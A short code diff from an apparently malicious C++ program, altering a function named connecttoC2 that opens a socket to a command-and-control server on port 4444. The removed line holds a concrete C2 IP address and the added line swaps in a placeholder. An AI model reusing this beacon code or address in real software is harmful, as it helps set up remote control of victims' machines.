@@ -46,7 +46,7 @@ void connecttoC2() {
 
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(4444); // Port
-    InetPton(AF_INET, TEXT("35.151.50.131"), &serverAddr.sin_addr); // C2 server address
+    InetPton(AF_INET, TEXT("255.255.255.255"), &serverAddr.sin_addr); // C2 server address
 
     if (connect(connectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
         cout << "Connection error" << endl;
